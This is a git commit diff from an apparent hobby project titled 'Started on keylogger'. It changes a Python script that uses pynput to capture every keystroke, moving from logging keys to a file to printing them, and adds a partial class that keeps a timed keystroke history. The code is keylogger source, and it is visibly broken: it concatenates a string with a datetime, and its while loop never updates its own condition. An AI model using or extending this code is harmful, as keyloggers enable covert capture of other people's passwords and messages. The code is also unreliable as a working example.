d3a24cd75861ebe7215ed1926999dbc958cee0ba
Nando5011 <Nando.imboden@bluewin.ch>
2023-09-16 04:43:14 +0200

    Started on keylogger

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -1,12 +1,33 @@
 from pynput.keyboard import Key, Listener
 import logging
-
-log_dir = "./logs/"
-
-logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+import datetime
+from datetime import timedelta
 
 def on_press(key):
-    logging.info(str(key))
+    print(str(key))
 
 with Listener(on_press=on_press) as listener:
     listener.join()
+
+
+class KeyLogger:
+    def __init__(self):
+        self.shortTimeHistory = []
+        self.longTimeHistory = []
+
+    def getTimeDeltaToNow(self, compareTime):
+        currentTime = datetime.datetime.now()
+        timeDelta = currentTime - compareTime
+        return timeDelta
+
+    def onKeyPress(self, keyStr):
+        self.shortTimeHistory.append(keyStr + datetime.datetime.now())
+        shortTimeHistoryTimeSpan = self.getTimeDeltaToNow(self.shortTimeHistory[0])
+        MAX_SHORTIMEHISTORYTIMESPAN = timedelta(minutes=5)
+        # Remove elements as long as the time span in the shortTimeHistory is >5min
+        while(shortTimeHistoryTimeSpan > MAX_SHORTIMEHISTORYTIMESPAN):
+            self.shortTimeHistory.pop(0)
+
+    def getShortTimeHistory(self):
+        return self.shortTimeHistory
+
